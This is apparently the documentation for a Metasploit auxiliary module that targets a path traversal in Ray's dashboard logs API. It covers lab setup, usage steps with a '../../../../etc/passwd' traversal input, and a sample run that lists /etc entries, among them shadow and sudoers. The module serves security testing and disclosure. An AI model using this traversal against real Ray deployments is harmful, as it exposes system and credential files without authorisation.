## Vulnerable Application

Ray (<=v2.56.0) is vulnerable to local filesystem path traversal (CVE assignment pending)

The vulnerability affects:

    * Ray (<=v2.56.0)

This module was successfully tested on:

    * Ray (v2.56.0) installed with Docker on Ubuntu 22.04

### Install and run the vulnerable Ray (v2.56.0)

1. Install your favorite virtualization engine (VirtualBox or VMware) on your preferred platform.
2. Install Ubuntu Linux (or other Linux distro) in your virtualization engine.
3. Pull pre-built Ray docker container (v2.56.0) in your VM.
   `docker pull rayproject/ray:2.56.0`
4. Start the ray container.

```
sudo docker run -d \
  --name ray-2.56.0 \
  --shm-size=8g \
  -p 192.168.1.30:8265:8265 \
  -p 192.168.1.30:6379:6379 \
  -p 192.168.1.30:10001:10001 \
  rayproject/ray:2.56.0 \
  ray start \
    --head \
    --dashboard-host=0.0.0.0 \
    --block
```


## Verification Steps
1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/gather/ray_dashboard_logs_api_path_traversal`
4. Do: `set rhosts <rhost>`
5. Do: `set FILE_PATH <relative file path on victim file system>` (../../../../etc/passwd)
6. Do: `run`
7. You should get folder contents from each discovered node


## Options

### NODE_ID
The Ray Node ID can be pulled directly from http://192.168.1.30:8265/#/logs.
This option is optional. If unset, the module retrieves node IDs from `/api/cluster_status`
and scans every discovered node. If set, only that node is scanned.

## Scenarios

```
msf > use auxiliary/gather/ray_dashboard_logs_api_path_traversal
msf auxiliary(gather/ray_dashboard_logs_api_path_traversal) > set RHOSTS 192.168.159.128
RHOSTS => 192.168.159.128
msf auxiliary(gather/ray_dashboard_logs_api_path_traversal) > check
[+] 192.168.159.128:8265 - The target is vulnerable. Ray 2.56.0 - path traversal via /api/v0/logs confirmed with node ID 3fe680fea39839eb553189fd4006a243e77d0958a6a73982c09e0a6d
msf auxiliary(gather/ray_dashboard_logs_api_path_traversal) > run
[*] Running module against 192.168.159.128
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Ray 2.56.0 - path traversal via /api/v0/logs confirmed with node ID 3fe680fea39839eb553189fd4006a243e77d0958a6a73982c09e0a6d
[+] Filesystem entries found for node ID 3fe680fea39839eb553189fd4006a243e77d0958a6a73982c09e0a6d:
  /etc/.pwd.lock
  /etc/adduser.conf
  /etc/alternatives/
  /etc/apt/
  /etc/bash.bashrc
  /etc/bindresvport.blacklist
  /etc/cloud/
  /etc/cron.d/
  /etc/cron.daily/
  /etc/debconf.conf
  /etc/debian_version
  /etc/default/
  /etc/deluser.conf
  /etc/dpkg/
  /etc/e2scrub.conf
  /etc/environment
  /etc/fstab
  /etc/gai.conf
  /etc/group
  /etc/gshadow
  /etc/gss/
  /etc/host.conf
  /etc/hostname
  /etc/hosts
  /etc/init.d/
  /etc/issue
  /etc/issue.net
  /etc/kernel/
  /etc/ld.so.cache
  /etc/ld.so.conf
  /etc/ld.so.conf.d/
  /etc/legal
  /etc/libaudit.conf
  /etc/login.defs
  /etc/logrotate.d/
  /etc/lsb-release
  /etc/machine-id
  /etc/mke2fs.conf
  /etc/netconfig
  /etc/networks
  /etc/nsswitch.conf
  /etc/opt/
  /etc/os-release
  /etc/pam.conf
  /etc/pam.d/
  /etc/passwd
  /etc/profile
  /etc/profile.d/
  /etc/rc0.d/
  /etc/rc1.d/
  /etc/rc2.d/
  /etc/rc3.d/
  /etc/rc4.d/
  /etc/rc5.d/
  /etc/rc6.d/
  /etc/rcS.d/
  /etc/resolv.conf
  /etc/rmt
  /etc/security/
  /etc/selinux/
  /etc/shadow
  /etc/shells
  /etc/skel/
  /etc/subgid
  /etc/subuid
  /etc/sysctl.conf
  /etc/sysctl.d/
  /etc/systemd/
  /etc/terminfo/
  /etc/update-motd.d/
  /etc/xattr.conf
  /etc/mtab
  /etc/fonts/
  /etc/X11/
  /etc/bash_completion.d/
  /etc/ca-certificates/
  /etc/ca-certificates.conf
  /etc/ethertypes
  /etc/group-
  /etc/gshadow-
  /etc/haproxy/
  /etc/inputrc
  /etc/ldap/
  /etc/localtime
  /etc/logcheck/
  /etc/passwd-
  /etc/perl/
  /etc/protocols
  /etc/rpc
  /etc/screenrc
  /etc/services
  /etc/shadow-
  /etc/ssh/
  /etc/ssl/
  /etc/subgid-
  /etc/subuid-
  /etc/sudo.conf
  /etc/sudo_logsrvd.conf
  /etc/sudoers
  /etc/sudoers.d/
  /etc/timezone
  /etc/tmpfiles.d/
  /etc/ucf.conf
  /etc/wgetrc
[+] Loot stored in: /home/smcintyre/.msf4/loot/20260731155208_default_192.168.159.128_ray.dashboard.fi_873007.txt
[*] Auxiliary module execution completed
msf auxiliary(gather/ray_dashboard_logs_api_path_traversal) >
```
